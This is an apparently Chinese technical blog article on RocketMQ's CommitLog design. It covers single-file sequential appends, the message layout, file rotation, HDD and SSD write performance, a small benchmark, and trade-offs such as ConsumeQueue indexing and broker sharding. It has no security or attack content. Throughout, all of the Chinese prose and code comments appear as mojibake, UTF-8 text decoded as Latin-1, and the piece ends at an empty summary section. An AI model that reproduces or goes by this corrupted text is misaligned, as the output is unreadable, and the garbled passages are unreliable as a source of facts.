<p>RocketMQæ˜¯é˜¿é‡Œå·´å·´å¼€æºçš„æ¶ˆæ¯ä¸­é—´ä»¶ï¼Œåœ¨é˜¿é‡Œå†…éƒ¨æ‰¿è½½ç€ç”µå•†ã€æ”¯ä»˜ã€ç‰©æµç­‰æ ¸å¿ƒä¸šåŠ¡çš„æµ·é‡æ¶ˆæ¯æµé‡ã€‚</p>
<p>æ ¹æ®å®˜æ–¹æ–‡æ¡£å’Œç¤¾åŒºå®è·µï¼Œå•æœºæ€§èƒ½å¤§è‡´åœ¨<strong>å‡ åƒåˆ°å‡ ä¸‡TPS</strong>ï¼Œä¼˜åŒ–åå¯è¾¾<strong>åä¸‡çº§åˆ«</strong>ã€‚å³ä½¿æ˜¯æ™®é€šé…ç½®çš„å‡ åƒTPSï¼Œå¯¹äºå¤§å¤šæ•°ä¸šåŠ¡åœºæ™¯ä¹Ÿå·²ç»è¶³å¤Ÿã€‚</p>
<p>é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼šè¿™ä¸ªæ€§èƒ½æ˜¯æ€ä¹ˆåšåˆ°çš„ï¼Ÿ</p>
<p>ç­”æ¡ˆåœ¨æºç ä¸­ï¼šæ”¯æ’‘è¿™ä¸ªæ€§èƒ½çš„æ ¸å¿ƒï¼Œæ˜¯ä¸€ä¸ªçœ‹èµ·æ¥å¾ˆç®€å•çš„è®¾è®¡å†³ç­–ï¼š</p>
<p><strong>æ‰€æœ‰Topicçš„æ¶ˆæ¯ï¼Œéƒ½å†™åˆ°åŒä¸€ä¸ªæ–‡ä»¶é‡Œï¼Œé¡ºåºè¿½åŠ ã€‚</strong></p>
<p>è¿™ä¸ªè®¾è®¡å«åšCommitLogã€‚å®ƒæ˜¯RocketMQå­˜å‚¨å±‚çš„åŸºçŸ³ï¼Œä¹Ÿæ˜¯ç†è§£æ•´ä¸ªRocketMQæ¶æ„çš„èµ·ç‚¹ã€‚</p>
<p>ä»Šå¤©æˆ‘ä»¬å°±æ¥æ‹†è§£è¿™ä¸ªè®¾è®¡ï¼šå®ƒæ˜¯ä»€ä¹ˆï¼Ÿä¸ºä»€ä¹ˆè¦è¿™æ ·è®¾è®¡ï¼Ÿæ€§èƒ½åˆ°åº•æœ‰å¤šå¥½ï¼Ÿæ›´é‡è¦çš„æ˜¯ï¼Œ<strong>è¦è¾¾åˆ°è¿™ä¸ªæ€§èƒ½éœ€è¦ä»€ä¹ˆæ¡ä»¶ï¼Ÿ</strong></p>
<h2 data-id="heading-1">ä¸€ã€CommitLogæ˜¯ä»€ä¹ˆï¼Ÿ</h2>
<h3 data-id="heading-2">1.1 æ ¸å¿ƒè®¾è®¡</h3>
<p>CommitLogçš„è®¾è®¡å¾ˆç®€å•ï¼š<strong>ä¸€ä¸ªæ–‡ä»¶ï¼Œé¡ºåºè¿½åŠ ï¼Œæ‰€æœ‰Topicçš„æ¶ˆæ¯å…±ç”¨ã€‚</strong></p>
<p>ç±»æ¯”ç¬”è®°æœ¬ï¼šä¸ç®¡æ˜¯è®¢å•ã€æ—¥å¿—è¿˜æ˜¯é€šçŸ¥æ¶ˆæ¯ï¼Œéƒ½ç›´æ¥åœ¨ç¬”è®°æœ¬æœ€åä¸€é¡µå¾€ä¸‹å†™ï¼Œä¸åˆ†ç±»ã€‚</p>
<pre><code class="hljs language-ini" lang="ini">CommitLogæ–‡ä»¶ï¼š
<span class="hljs-section">[è®¢å•æ¶ˆæ¯-001]</span> â† Topic: order
<span class="hljs-section">[æ—¥å¿—æ¶ˆæ¯-001]</span> â† Topic: log  
<span class="hljs-section">[è®¢å•æ¶ˆæ¯-002]</span> â† Topic: order
<span class="hljs-section">[é€šçŸ¥æ¶ˆæ¯-001]</span> â† Topic: notify
...
</code></pre>
<h3 data-id="heading-3">1.2 æ¶ˆæ¯å­˜å‚¨æ ¼å¼</h3>
<p>æ¯æ¡æ¶ˆæ¯åŒ…å«13ä¸ªå­—æ®µï¼Œå®šé•¿å­—æ®µåœ¨å‰ï¼ˆ48å­—èŠ‚ï¼‰ï¼Œå˜é•¿å­—æ®µåœ¨åï¼š</p>
<pre><code class="hljs language-scss" lang="scss">å®šé•¿éƒ¨åˆ†ï¼ˆ<span class="hljs-number">48</span>å­—èŠ‚ï¼‰ï¼š
- <span class="hljs-built_in">TOTALSIZE</span>(<span class="hljs-number">4</span>) + <span class="hljs-built_in">MAGICCODE</span>(<span class="hljs-number">4</span>) + <span class="hljs-built_in">BODYCRC</span>(<span class="hljs-number">4</span>) + <span class="hljs-built_in">QUEUEID</span>(<span class="hljs-number">4</span>)
- <span class="hljs-built_in">QUEUEOFFSET</span>(<span class="hljs-number">8</span>) + <span class="hljs-built_in">PHYSICALOFFSET</span>(<span class="hljs-number">8</span>)
- <span class="hljs-built_in">BORNTIMESTAMP</span>(<span class="hljs-number">8</span>) + <span class="hljs-built_in">STORETIMESTAMP</span>(<span class="hljs-number">8</span>)

å˜é•¿éƒ¨åˆ†ï¼š
- Topic + <span class="hljs-selector-tag">Body</span> + Properties
</code></pre>
<p>å®šé•¿åœ¨å‰çš„è®¾è®¡è®©è§£æå¾ˆå¿«ï¼šå…ˆè¯»48å­—èŠ‚ï¼Œå°±çŸ¥é“åé¢å˜é•¿éƒ¨åˆ†æœ‰å¤šé•¿ã€‚</p>
<h3 data-id="heading-4">1.3 æ–‡ä»¶ç®¡ç†</h3>
<p>CommitLogä¸æ˜¯å•ä¸ªæ— é™å¤§çš„æ–‡ä»¶ï¼Œè€Œæ˜¯å¤šä¸ª1GBæ–‡ä»¶ç»„æˆçš„é˜Ÿåˆ—ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">$ROCKETMQ_HOME/store/commitlog/
â”œâ”€â”€ 00000000000000000000  (ç¬¬1ä¸ªï¼Œ<span class="hljs-attr">offset</span>=<span class="hljs-number">0</span>)
â”œâ”€â”€ 00000001073741824     (ç¬¬2ä¸ªï¼Œ<span class="hljs-attr">offset</span>=<span class="hljs-number">1</span>GB)
â”œâ”€â”€ 00000002147483648     (ç¬¬3ä¸ªï¼Œ<span class="hljs-attr">offset</span>=<span class="hljs-number">2</span>GB)
</code></pre>
<p>æ–‡ä»¶åå³èµ·å§‹åç§»é‡ã€‚å½“å‰æ–‡ä»¶å†™æ»¡1GBåï¼Œè‡ªåŠ¨åˆ›å»ºæ–°æ–‡ä»¶ç»§ç»­è¿½åŠ ã€‚</p>
<h3 data-id="heading-5">1.4 æ ¸å¿ƒå†™å…¥é€»è¾‘</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> AppendResult <span class="hljs-title function_">putMessage</span><span class="hljs-params">(Message msg)</span> {
    putMessageLock.lock();  <span class="hljs-comment">// 1. åŠ é”</span>
    <span class="hljs-keyword">try</span> {
        <span class="hljs-type">MappedFile</span> <span class="hljs-variable">mappedFile</span> <span class="hljs-operator">=</span> getLastMappedFile();  <span class="hljs-comment">// 2. è·å–å½“å‰æ–‡ä»¶</span>
        <span class="hljs-keyword">if</span> (mappedFile.isFull()) {
            mappedFile = createNewFile();  <span class="hljs-comment">// 3. æ–‡ä»¶æ»¡äº†å°±åˆ›å»ºæ–°æ–‡ä»¶</span>
        }
        <span class="hljs-keyword">return</span> mappedFile.appendMessage(msg);  <span class="hljs-comment">// 4. è¿½åŠ æ¶ˆæ¯</span>
    } <span class="hljs-keyword">finally</span> {
        putMessageLock.unlock();
    }
}
</code></pre>
<p>æ•´ä¸ªæµç¨‹ï¼šåŠ é” â†’ æ‰¾æ–‡ä»¶ â†’ è¿½åŠ  â†’ è§£é”ã€‚æ²¡æœ‰å¤æ‚çš„ç´¢å¼•æ›´æ–°ï¼Œæ²¡æœ‰Bæ ‘ç»´æŠ¤ï¼Œå°±æ˜¯å¾€æ–‡ä»¶æœ«å°¾å†™æ•°æ®ã€‚</p>
<h2 data-id="heading-6">äºŒã€ä¸ºä»€ä¹ˆè¦è¿™æ ·è®¾è®¡ï¼Ÿ</h2>
<h3 data-id="heading-7">2.1 ä¸ºä»€ä¹ˆä¸æ˜¯æ¯ä¸ªTopicä¸€ä¸ªæ–‡ä»¶ï¼Ÿ</h3>
<p>æŒ‰å¸¸è§„æ€è·¯ï¼Œåº”è¯¥æ¯ä¸ªTopicä¸€ä¸ªæ–‡ä»¶ï¼š</p>
<pre><code class="hljs language-c" lang="c">è®¢å•Topic â†’ order.<span class="hljs-built_in">log</span>
æ—¥å¿—Topic â†’ <span class="hljs-built_in">log</span>.<span class="hljs-built_in">log</span>
é€šçŸ¥Topic â†’ notify.<span class="hljs-built_in">log</span>
</code></pre>
<p>è¿™æ ·è¯»å†™éƒ½æ–¹ä¾¿ã€‚ä½†RocketMQæ²¡è¿™ä¹ˆåšï¼ŒåŸå› æ˜¯<strong>æ€§èƒ½ä¼šå´©æ‰</strong>ã€‚</p>
<h3 data-id="heading-8">2.2 å¤šæ–‡ä»¶æ–¹æ¡ˆçš„é—®é¢˜</h3>
<p>é—®é¢˜ä¸åœ¨åº”ç”¨å±‚å¹¶å‘åº¦ï¼Œè€Œåœ¨ç£ç›˜ç‰©ç†ç‰¹æ€§ã€‚</p>
<p><strong>HDDçš„ç‰©ç†é™åˆ¶ï¼š</strong></p>
<p>å³ä½¿åº”ç”¨å±‚ç”¨1000ä¸ªçº¿ç¨‹å†™1000ä¸ªæ–‡ä»¶ï¼Œç£ç›˜å±‚ä»ç„¶ä¸²è¡Œï¼š</p>
<pre><code class="hljs language-scss" lang="scss">åº”ç”¨å±‚ï¼š<span class="hljs-number">1000</span>çº¿ç¨‹å¹¶å‘å†™
    â†“
ç£ç›˜å±‚ï¼šç£å¤´ä¸²è¡Œè·³è·ƒ
    â†’ file-<span class="hljs-number">1</span> (å¯»é“<span class="hljs-number">10ms</span>)
    â†’ file-<span class="hljs-number">2</span> (å¯»é“<span class="hljs-number">10ms</span>)
    â†’ file-<span class="hljs-number">3</span> (å¯»é“<span class="hljs-number">10ms</span>)
</code></pre>
<p>1000ä¸ªTopicåœºæ™¯ï¼Œæ€§èƒ½å¯¹æ¯”ï¼š</p>
<pre><code class="hljs language-diff" lang="diff">å¤šæ–‡ä»¶ï¼ˆHDDï¼‰ï¼š
<span class="hljs-deletion">- ç£å¤´è·³è·ƒ1000æ¬¡</span>
<span class="hljs-deletion">- æ¯æ¬¡å¯»é“10-15ms  </span>
<span class="hljs-deletion">- æ€§èƒ½ï¼š100-1000 msg/s</span>

å•æ–‡ä»¶ï¼ˆHDDï¼‰ï¼š
<span class="hljs-deletion">- ç£å¤´å›ºå®šï¼Œè¿ç»­å†™</span>
<span class="hljs-deletion">- å……åˆ†åˆ©ç”¨å¸¦å®½ï¼š100-150 MB/s</span>
<span class="hljs-deletion">- æ€§èƒ½ï¼š50,000-80,000 msg/s</span>

å·®è·ï¼š50-800å€
</code></pre>
<p><strong>SSDä¹Ÿæœ‰é—®é¢˜ï¼š</strong></p>
<p>è™½ç„¶SSDæ²¡æœ‰ç£å¤´ï¼Œä½†å¤šæ–‡ä»¶ä»æœ‰å¼€é”€ï¼š</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> æ–‡ä»¶å…ƒæ•°æ®å¼€é”€ï¼ˆinodeã€æ—¶é—´æˆ³ï¼‰
<span class="hljs-bullet">2.</span> PageCacheç¢ç‰‡åŒ–ï¼ˆ1000ä¸ªç¼“å†²åŒºï¼Œå‘½ä¸­ç‡ä½ï¼‰
<span class="hljs-bullet">3.</span> SSDå†…éƒ¨GCå’Œå†™æ”¾å¤§

æ€§èƒ½å¯¹æ¯”ï¼š
å¤šæ–‡ä»¶ï¼ˆSSDï¼‰ï¼š10,000-50,000 msg/s
å•æ–‡ä»¶ï¼ˆSSDï¼‰ï¼š100,000-300,000 msg/s
å·®è·ï¼š5-30å€
</code></pre>
<h3 data-id="heading-9">2.3 é¡ºåºå†™ vs éšæœºå†™çš„æœ¬è´¨</h3>
<p>ä¸ºä»€ä¹ˆå·®è·è¿™ä¹ˆå¤§ï¼Ÿæ ¸å¿ƒåŸå› æ˜¯ç£ç›˜çš„ç‰©ç†ç‰¹æ€§ã€‚</p>
<p><strong>æœºæ¢°ç¡¬ç›˜ï¼ˆHDDï¼‰çš„ç—›ç‚¹ï¼š</strong></p>
<p>ç£ç›˜æ˜¯ä¸€ä¸ªåœ†ç›˜ï¼Œæ•°æ®å­˜å‚¨åœ¨ç›˜ç‰‡çš„ä¸åŒä½ç½®ã€‚è¦å†™å…¥æ•°æ®ï¼Œç£å¤´éœ€è¦ç§»åŠ¨åˆ°å¯¹åº”ä½ç½®ã€‚</p>
<pre><code class="hljs language-bash" lang="bash">é¡ºåºå†™ï¼š
ç£å¤´å›ºå®šåœ¨ä¸€ä¸ªä½ç½®ï¼Œæ•°æ®è¿ç»­å†™å…¥
â†’ æ— éœ€ç§»åŠ¨ç£å¤´
â†’ å……åˆ†åˆ©ç”¨ç›˜ç‰‡æ—‹è½¬é€Ÿåº¦
â†’ ååé‡ï¼š100-200 MB/s

éšæœºå†™ï¼š
ç£å¤´éœ€è¦ä¸æ–­ç§»åŠ¨åˆ°ä¸åŒä½ç½®
â†’ æ¯æ¬¡ç§»åŠ¨è€—æ—¶10-15msï¼ˆå¯»é“æ—¶é—´ï¼Œå³ç£å¤´ç§»åŠ¨åˆ°ç›®æ ‡ä½ç½®çš„æ—¶é—´ï¼‰
â†’ æ¯ç§’æœ€å¤šç§»åŠ¨100æ¬¡
â†’ ååé‡ï¼š5-10 MB/s
</code></pre>
<p><strong>å›ºæ€ç¡¬ç›˜ï¼ˆSSDï¼‰çš„å·®å¼‚ï¼š</strong></p>
<p>SSDæ²¡æœ‰ç‰©ç†ç§»åŠ¨éƒ¨ä»¶ï¼Œéšæœºå†™æ€§èƒ½å¥½å¾ˆå¤šï¼Œä½†é¡ºåºå†™ä»ç„¶æœ‰ä¼˜åŠ¿ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">é¡ºåºå†™ï¼š300-500 MB/s
éšæœºå†™ï¼š200-300 MB/s
å·®è·ï¼š1.5-2å€
</code></pre>
<p>è™½ç„¶å·®è·æ²¡æœ‰HDDé‚£ä¹ˆå¤¸å¼ ï¼Œä½†åœ¨å¤šTopicåœºæ™¯ä¸‹ï¼Œå·®è·ä¼šè¢«æ”¾å¤§ã€‚</p>
<h3 data-id="heading-10">2.4 PageCacheçš„å¨åŠ›</h3>
<p>è¿˜æœ‰ä¸€ä¸ªå…³é”®å› ç´ ï¼š<strong>PageCacheï¼ˆé¡µç¼“å­˜ï¼‰</strong>ã€‚</p>
<p>æ“ä½œç³»ç»Ÿä¼šæŠŠç£ç›˜æ–‡ä»¶ç¼“å­˜åœ¨å†…å­˜ä¸­ã€‚å½“ä½ å†™å…¥æ–‡ä»¶æ—¶ï¼Œå®é™…ä¸Šæ˜¯å†™å…¥PageCacheï¼Œç„¶åæ“ä½œç³»ç»Ÿå¼‚æ­¥åˆ·åˆ°ç£ç›˜ã€‚</p>
<p><strong>é¡ºåºå†™çš„PageCacheä¼˜åŠ¿ï¼š</strong></p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-string">CommitLogï¼ˆå•æ–‡ä»¶ï¼‰ï¼š</span>
<span class="hljs-string">æ‰€æœ‰æ¶ˆæ¯è¿ç»­å†™å…¥</span> <span class="hljs-string">â†’</span> <span class="hljs-string">PageCacheè¿ç»­</span> <span class="hljs-string">â†’</span> <span class="hljs-string">å‘½ä¸­ç‡é«˜</span>

<span class="hljs-string">å¤šæ–‡ä»¶ï¼š</span>
<span class="hljs-number">1000</span><span class="hljs-string">ä¸ªæ–‡ä»¶åˆ†æ•£å†™å…¥</span> <span class="hljs-string">â†’</span> <span class="hljs-string">PageCacheåˆ†æ•£</span> <span class="hljs-string">â†’</span> <span class="hljs-string">å‘½ä¸­ç‡ä½</span>
</code></pre>
<p>PageCacheçš„å‘½ä¸­ç‡ï¼Œç›´æ¥å½±å“è¯»å†™æ€§èƒ½ã€‚é¡ºåºå†™è®©æ•°æ®åœ¨å†…å­˜ä¸­è¿ç»­ï¼Œé¢„è¯»æœºåˆ¶æ›´æœ‰æ•ˆï¼Œç¼“å­˜æ·˜æ±°æ›´å°‘ã€‚</p>
<p>è¿™å°±æ˜¯ä¸ºä»€ä¹ˆRocketMQè¦ç”¨å•æ–‡ä»¶é¡ºåºå†™ã€‚</p>
<h2 data-id="heading-11">ä¸‰ã€æ€§èƒ½éªŒè¯ï¼šæ‰‹å†™æµ‹è¯•å¯¹æ¯”</h2>
<p>ç†è®ºè¯´å†å¤šï¼Œä¸å¦‚å®æµ‹æ¥å¾—ç›´æ¥ã€‚</p>
<p>æˆ‘å‚è€ƒRocketMQçš„è®¾è®¡ï¼Œæ‰‹å†™äº†ä¸€ä¸ªç®€åŒ–ç‰ˆçš„CommitLogï¼Œç”¨mmapï¼ˆå†…å­˜æ˜ å°„æ–‡ä»¶ï¼Œé¿å…ç”¨æˆ·æ€/å†…æ ¸æ€æ•°æ®æ‹·è´ï¼‰å®ç°é¡ºåºå†™ã€‚ç„¶åå†™äº†ä¸ªå¯¹æ¯”æµ‹è¯•ï¼Œçœ‹çœ‹é¡ºåºå†™å’Œéšæœºå†™åˆ°åº•å·®å¤šå°‘ã€‚</p>
<h3 data-id="heading-12">3.1 æµ‹è¯•åœºæ™¯</h3>
<p><strong>æµ‹è¯•ç¯å¢ƒï¼š</strong></p>
<ul>
<li>æ“ä½œç³»ç»Ÿï¼šmacOS 14.3.1</li>
<li>ç£ç›˜ï¼šSSD</li>
<li>æµ‹è¯•æ•°æ®ï¼š10ä¸‡æ¡æ¶ˆæ¯ï¼Œæ¯æ¡1KBï¼Œå…±97MB</li>
</ul>
<p><strong>é¡ºåºå†™å®ç°ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä½¿ç”¨mmapï¼Œé¡ºåºè¿½åŠ </span>
<span class="hljs-type">MappedByteBuffer</span> <span class="hljs-variable">buffer</span> <span class="hljs-operator">=</span> fileChannel.map(MapMode.READ_WRITE, <span class="hljs-number">0</span>, fileSize);
<span class="hljs-keyword">for</span> (Message msg : messages) {
    buffer.put(encodeMessage(msg));  <span class="hljs-comment">// é¡ºåºè¿½åŠ </span>
}
</code></pre>
<p><strong>éšæœºå†™å®ç°ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// é¢„åˆ†é…æ–‡ä»¶ï¼Œéšæœºä½ç½®å†™å…¥</span>
<span class="hljs-type">RandomAccessFile</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RandomAccessFile</span>(<span class="hljs-string">"random.log"</span>, <span class="hljs-string">"rw"</span>);
file.setLength(fileSize);  <span class="hljs-comment">// é¢„åˆ†é…ç©ºé—´</span>
<span class="hljs-keyword">for</span> (Message msg : messages) {
    <span class="hljs-type">long</span> <span class="hljs-variable">randomPos</span> <span class="hljs-operator">=</span> random.nextLong(fileSize);
    file.seek(randomPos);
    file.write(encodeMessage(msg));  <span class="hljs-comment">// éšæœºå†™å…¥</span>
}
</code></pre>
<h3 data-id="heading-13">3.2 æµ‹è¯•ç»“æœ</h3>
<p>æµ‹è¯•ç¯å¢ƒï¼šSSDï¼Œæ•°æ®é‡97MBï¼ˆ10ä¸‡æ¡Ã—1KBï¼‰</p>




















<table><thead><tr><th>æŒ‡æ ‡</th><th>é¡ºåºå†™</th><th>éšæœºå†™</th></tr></thead><tbody><tr><td>æ€»è€—æ—¶</td><td>360 ms</td><td>267 ms</td></tr><tr><td>ååé‡</td><td>271 MB/s</td><td>365 MB/s</td></tr></tbody></table>
<p><strong>ä¸ºä»€ä¹ˆéšæœºå†™æ›´å¿«ï¼Ÿ</strong></p>
<p>è¿™æ˜¯SSD + å°æ•°æ®é‡ + æ–‡ä»¶é¢„åˆ†é…çš„ç‰¹æ®Šæƒ…å†µï¼š</p>
<ol>
<li>SSDéšæœºå†™æ€§èƒ½æ¥è¿‘é¡ºåºå†™ï¼ˆå·®è·ä»…1.2-2å€ï¼‰</li>
<li>97MBå®Œå…¨åœ¨PageCacheä¸­ï¼Œæœªè§¦å‘çœŸå®ç£ç›˜IO</li>
<li>éšæœºå†™æå‰é¢„åˆ†é…æ–‡ä»¶ï¼Œé¿å…äº†å…ƒæ•°æ®æ›´æ–°å¼€é”€</li>
</ol>
<p><strong>HDDç¯å¢ƒçš„ç†è®ºå¯¹æ¯”ï¼š</strong></p>
<pre><code class="hljs language-bash" lang="bash">é¡ºåºå†™ï¼š100-150 MB/sï¼Œæ€§èƒ½ 100,000-150,000 msg/s
éšæœºå†™ï¼šæ¯æ¬¡å¯»é“10-15msï¼Œæ€§èƒ½ 5,000-10,000 msg/s
å·®è·ï¼š10-30å€
</code></pre>
<p>ç»“è®ºï¼šSSDä¸Šéšæœºå†™ä¸æ…¢ï¼Œä½†é¡ºåºå†™ä»æœ‰ä¼˜åŠ¿ã€‚çœŸæ­£å·®è·ä½“ç°åœ¨å¤šTopicã€å¤§æ•°æ®é‡ã€å®šæœŸåˆ·ç›˜ï¼ˆå°†å†…å­˜ä¸­çš„æ•°æ®å¼ºåˆ¶å†™å…¥ç£ç›˜ï¼‰çš„åœºæ™¯ã€‚</p>
<h3 data-id="heading-14">3.3 ç”Ÿäº§åœºæ™¯å¯¹æ¯”</h3>
<p><strong>å¤šTopicåœºæ™¯ï¼ˆHDDï¼‰ï¼š</strong></p>
<p>1000ä¸ªTopicï¼Œæ¯ä¸ªTopicä¸€ä¸ªæ–‡ä»¶ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">å¤šæ–‡ä»¶ï¼šç£å¤´è·³è·ƒï¼Œæ€§èƒ½ 100-1000 msg/s
å•æ–‡ä»¶ï¼šé¡ºåºå†™å…¥ï¼Œæ€§èƒ½ 50,000-80,000 msg/s
å·®è·ï¼š50-800å€
</code></pre>
<p><strong>å®šæœŸåˆ·ç›˜åœºæ™¯ï¼ˆSSDï¼‰ï¼š</strong></p>
<p>æ¯ç§’åˆ·ç›˜ä¸€æ¬¡ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">é¡ºåºå†™ï¼šæ•°æ®è¿ç»­ï¼Œä¸€æ¬¡æ€§åˆ·ç›˜ï¼Œæ€§èƒ½ 100,000-200,000 msg/s
éšæœºå†™ï¼šæ•°æ®åˆ†æ•£ï¼Œå¤šæ¬¡åˆ·ç›˜ï¼Œæ€§èƒ½ 10,000-20,000 msg/s  
å·®è·ï¼š5-10å€
</code></pre>
<h3 data-id="heading-15">3.4 ä¸åˆ·ç›˜çš„"å‡æ€§èƒ½"</h3>
<p>SimpleCommitLogæµ‹è¯•ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">å†™å…¥ï¼š10,000æ¡
è€—æ—¶ï¼š20 ms
TPSï¼š500,000 msg/s
</code></pre>
<p>è¿™ä¸ªæ•°æ®æ²¡æœ‰å‚è€ƒä»·å€¼ï¼Œå› ä¸ºï¼š</p>
<ol>
<li>æ²¡æœ‰åˆ·ç›˜ - å®•æœºå¿…ä¸¢æ•°æ®</li>
<li>æ•°æ®å¤ªå° - å®Œå…¨åœ¨å†…å­˜ä¸­</li>
<li>æ²¡æœ‰ç½‘ç»œå¼€é”€</li>
<li>æ²¡æœ‰ç´¢å¼•æ„å»º</li>
</ol>
<p>åŠ ä¸Šåˆ·ç›˜ + ç½‘ç»œ + ç´¢å¼•åï¼ŒçœŸå®æ€§èƒ½ï¼š</p>
<pre><code class="hljs">å¼‚æ­¥åˆ·ç›˜ï¼ˆå…ˆè¿”å›æˆåŠŸï¼Œåå°å®šæ—¶åˆ·ç›˜ï¼‰ï¼š20,000-40,000 TPS
åŒæ­¥åˆ·ç›˜ï¼ˆç­‰å¾…åˆ·ç›˜å®Œæˆæ‰è¿”å›ï¼‰ï¼š5,000-10,000 TPS
æ€§èƒ½é™ä½ï¼š10-100å€
</code></pre>
<p>çœ‹æ€§èƒ½æ•°æ®å¿…é¡»é—®æ¸…æ¥šæµ‹è¯•æ¡ä»¶ï¼Œä¸åˆ·ç›˜çš„æ•°æ®æ²¡æœ‰æ„ä¹‰ã€‚</p>
<h2 data-id="heading-16">å››ã€è®¾è®¡æƒè¡¡ï¼šå•æ–‡ä»¶å¸¦æ¥çš„æŒ‘æˆ˜</h2>
<p>é¡ºåºå†™æ€§èƒ½è¿™ä¹ˆå¥½ï¼Œæ˜¯ä¸æ˜¯å°±æ²¡æœ‰ç¼ºç‚¹äº†ï¼Ÿ</p>
<p>å½“ç„¶ä¸æ˜¯ã€‚ä»»ä½•è®¾è®¡éƒ½æ˜¯æƒè¡¡ã€‚</p>
<h3 data-id="heading-17">4.1 è¯»å–é—®é¢˜ï¼šå¦‚ä½•å¿«é€Ÿæ‰¾åˆ°æŸä¸ªTopicçš„æ¶ˆæ¯ï¼Ÿ</h3>
<p>æ‰€æœ‰Topicçš„æ¶ˆæ¯æ··åœ¨ä¸€èµ·ï¼Œæ¶ˆè´¹è€…æ€ä¹ˆè¯»å–ï¼Ÿ</p>
<p>éš¾é“è¦ä»å¤´åˆ°å°¾æ‰«æCommitLogï¼Œæ‰¾å‡ºè‡ªå·±Topicçš„æ¶ˆæ¯å—ï¼Ÿé‚£æ€§èƒ½å°±ç‚¸äº†ã€‚</p>
<p><strong>RocketMQçš„è§£å†³æ–¹æ¡ˆï¼šConsumeQueueç´¢å¼•</strong></p>
<pre><code class="hljs language-ini" lang="ini">CommitLogï¼ˆç‰©ç†å­˜å‚¨ï¼‰ï¼š
<span class="hljs-section">[è®¢å•-001]</span><span class="hljs-section">[æ—¥å¿—-001]</span><span class="hljs-section">[è®¢å•-002]</span><span class="hljs-section">[é€šçŸ¥-001]</span><span class="hljs-section">[æ—¥å¿—-002]</span>...

ConsumeQueueï¼ˆé€»è¾‘ç´¢å¼•ï¼‰ï¼š
è®¢å•Queue: <span class="hljs-section">[offset-0]</span><span class="hljs-section">[offset-2]</span>...
æ—¥å¿—Queue: <span class="hljs-section">[offset-1]</span><span class="hljs-section">[offset-4]</span>...
é€šçŸ¥Queue: <span class="hljs-section">[offset-3]</span>...
</code></pre>
<p>CommitLogåªè´Ÿè´£å†™å…¥ï¼ˆé¡ºåºè¿½åŠ ï¼‰ï¼ŒConsumeQueueè´Ÿè´£ç´¢å¼•ï¼ˆå¼‚æ­¥æ„å»ºï¼‰ã€‚</p>
<p>æ¶ˆè´¹è€…è¯»å–æ—¶ï¼š</p>
<ol>
<li>å…ˆè¯»ConsumeQueueï¼Œæ‰¾åˆ°æ¶ˆæ¯åœ¨CommitLogçš„ç‰©ç†åç§»é‡</li>
<li>å†å»CommitLogè¯»å–å®é™…æ¶ˆæ¯</li>
</ol>
<p>è¿™å°±æ˜¯<strong>è¯»å†™åˆ†ç¦»</strong>ï¼šå†™å…¥èµ°CommitLogï¼ˆé¡ºåºå†™ï¼‰ï¼Œè¯»å–èµ°ConsumeQueueï¼ˆç´¢å¼•æŸ¥æ‰¾ï¼‰ã€‚</p>
<h3 data-id="heading-18">4.2 ç©ºé—´é—®é¢˜ï¼šæ‰€æœ‰æ¶ˆæ¯éƒ½å­˜å‚¨ï¼Œå ç”¨å¤§</h3>
<p>æ¯æ¡æ¶ˆæ¯éƒ½å­˜åœ¨CommitLogä¸­ï¼Œä¸ç®¡æœ‰æ²¡æœ‰è¢«æ¶ˆè´¹ï¼Œéƒ½è¦å ç”¨ç£ç›˜ç©ºé—´ã€‚</p>
<p><strong>RocketMQçš„è§£å†³æ–¹æ¡ˆï¼šå®šæœŸæ¸…ç†</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// é»˜è®¤ä¿ç•™72å°æ—¶</span>
fileReservedTime = <span class="hljs-number">72</span>

<span class="hljs-comment">// ç£ç›˜ä½¿ç”¨ç‡è¶…è¿‡75%ï¼Œå¼ºåˆ¶åˆ é™¤</span>
diskMaxUsedSpaceRatio = <span class="hljs-number">75</span>
</code></pre>
<p>è¿‡æœŸçš„CommitLogæ–‡ä»¶ä¼šè¢«åˆ é™¤ï¼Œé‡Šæ”¾ç©ºé—´ã€‚</p>
<h3 data-id="heading-19">4.3 å•ç‚¹ç“¶é¢ˆï¼šé¡ºåºå†™åªèƒ½å•ç‚¹</h3>
<p>CommitLogæ˜¯å•ç‚¹é¡ºåºå†™ï¼Œæ— æ³•å¹¶è¡Œã€‚è¿™æ˜¯æ€§èƒ½çš„å¤©èŠ±æ¿ã€‚</p>
<p><strong>RocketMQçš„è§£å†³æ–¹æ¡ˆï¼šBrokeråˆ†ç‰‡</strong></p>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">Broker1: å¤„ç† Topic A, B, C</span>
<span class="hljs-section">Broker2: å¤„ç† Topic D, E, F</span>
<span class="hljs-section">Broker3: å¤„ç† Topic G, H, I</span>
</code></pre>
<p>é€šè¿‡å¤šä¸ªBrokeræ¨ªå‘æ‰©å±•ï¼Œæ¯ä¸ªBrokerç»´æŠ¤è‡ªå·±çš„CommitLogã€‚</p>
<h3 data-id="heading-20">4.4 æƒè¡¡æ€»ç»“</h3>



































